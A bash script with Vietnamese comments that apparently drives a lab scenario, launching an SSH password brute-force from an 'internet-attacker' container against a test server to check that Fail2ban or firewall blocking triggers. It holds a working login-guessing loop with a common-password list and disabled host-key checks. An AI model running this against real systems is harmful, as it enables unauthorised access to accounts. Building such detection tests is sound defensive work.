#!/usr/bin/env bash
# =============================================================================
# Kịch bản 05: Dò quét mật khẩu quản trị SSH từ Internet (SSH Brute-force)
# Mục đích: Bắn liên tục các kết nối SSH với mật khẩu sai vào tài khoản quản trị
# Nguồn: internet-attacker (203.0.113.10)
# Đích: service-server (192.168.10.10:22)
# Điểm chặn tự động: Firewall hoặc Server (khóa IP sau N lần thất bại - Fail2ban)
# Công cụ: sshpass + OpenSSH client
# =============================================================================
set -euo pipefail

DURATION="${1:-60}"
P="clab-aiops-prod"

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [START] Kịch bản 05: SSH Brute-force (Thời lượng: ${DURATION}s)..."

cleanup() {
  echo
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CLEANUP] Dừng SSH brute-force trên internet-attacker..."
  docker exec "$P-internet-attacker" killall ssh sshpass 2>/dev/null || true
}
trap cleanup INT TERM EXIT

echo "  [+] Bắt đầu dò quét mật khẩu SSH dồn dập vào 192.168.10.10:22..."
STOP=0
(
  PASSWORDS=("123456" "password" "admin" "root" "Corp@123" "welcome" "pass123" "qwerty")
  USERS=("opsadmin" "root" "admin" "user")

  while [ "$STOP" -eq 0 ]; do
    for u in "${USERS[@]}"; do
      for p in "${PASSWORDS[@]}"; do
        [ "$STOP" -ne 0 ] && break 2
        # Thử đăng nhập SSH với timeout ngắn 1s
        docker exec "$P-internet-attacker" sh -c \
          "sshpass -p '$p' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=1 '$u@192.168.10.10' 'id' >/dev/null 2>&1 || true" &
      done
    done
    wait 2>/dev/null || true
    sleep 0.5
  done
) &
BRUTE_PID=$!

ELAPSED=0
while [ "$ELAPSED" -lt "$DURATION" ]; do
  sleep 2
  ELAPSED=$((ELAPSED + 2))
done

STOP=1
kill "$BRUTE_PID" 2>/dev/null || true
wait "$BRUTE_PID" 2>/dev/null || true
cleanup

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [END] Kịch bản 05: SSH Brute-force hoàn thành."
